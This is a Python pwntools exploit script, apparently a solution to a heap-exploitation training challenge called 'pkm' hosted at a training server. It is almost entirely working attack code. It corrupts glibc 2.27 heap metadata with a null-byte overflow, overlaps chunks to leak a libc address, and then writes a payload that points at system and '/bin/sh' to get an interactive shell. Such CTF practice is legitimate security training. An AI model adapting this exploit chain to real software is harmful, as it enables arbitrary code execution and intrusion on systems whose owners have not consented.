from pwn import *
import sys
import os
#context.log_level='DEBUG'

debug=False

free=[0]*50
def find_index():
    global free
    for i in range(50):
        if(free[i]==0):
            return i


def new():
    global free
    p.recvuntil(b">")
    try:
        p.sendline(b"0")
    except:
        print("Error new")
    index=find_index()
    free[index]=1
    return index

def rename(i,size,content):
    p.recvuntil(b">")
    try:
        p.sendline(b"1")
        p.sendline(b"%d"%i)
        p.recvuntil(b":")
        p.sendline(b"%d"%size)
        p.send(content)
    except:
        print("Error writing")

def delete(i):
    global free
    try:
        p.recvuntil(b">")
        p.sendline(b"2")
        p.recvuntil(b">")
        p.sendline(b"%d"%i)
        free[i]=1
    except:
        print("Errore delete")

def info(i):
    p.recvuntil(b">")
    try:
        p.sendline(b"4")
        p.recvuntil(b">")
        p.sendline(b"%d"%i)
        line=p.recvline()
        name=line[9:-1]
        line=p.recvline()
        attack=line[8:-1]
        return {"name": name, "attack":attack}
    except:
        print("Errore free")
    return name

#def fight(pkm_1,)

######################################################################

libc_elf=ELF("./libc-2.27_notcache.so")
bin=ELF("./pkm")
index=-1

if len(sys.argv) > 1:
    p=remote("training.jinblack.it",2025)
else:
    p=process("./pkm")
    if debug:
        gdb.attach(p, """ 
                    
                    c 
                """)

# PKM_base
chunk_base=new()
# PKM_0
chunk_A=new()
rename(chunk_A,0x40,b"aaaaaaaaaaaaa\n")
# PKM_1
chunk_B=new()
# Name_PKM0
rename(chunk_base,0x28,b"a\n")
# PKM_2
chunk_C=new()

#Overwrite chunk C (Null poison)
rename(chunk_base,0x28, b"a"*0x20+p64(0x280))

#Add for not consolidate the Top Chunk
chunk_off=new()

#Add to unsorted bins to avoid checks
delete(chunk_A)

#Consolidate with A
delete(chunk_C)

#leaking
rename(chunk_B,0x40,b"aaaaaaa\n")
chunk_over_A=new()
leaked=u64(info(chunk_B)["name"]+b"\x00\x00")
print("[*] Leaked: %#x" % leaked)
libc_base=leaked-4074624
print("[*] Libc: %#x" % libc_base)
libc_elf.address=libc_base

#write the function over B
sh=libc_elf.search(b"/bin/sh\x00")
bin_sh=next(sh)
system_addr=libc_elf.symbols["system"]

payload_over_B=p64(0x28)+p64(0xf)+p64(0x64)+p64(0x64)+p64(0x0)+p64(bin_sh)+p64(0x1)#+p64(0x0)*5+p64(bin_sh)+p64(system_addr)

p.sendline(b"1")
p.sendline(b"4")
p.sendline(b"240")
#p.send(payload_over_B)
p.sendline(payload_over_B)
p.recv()
p.interactive()
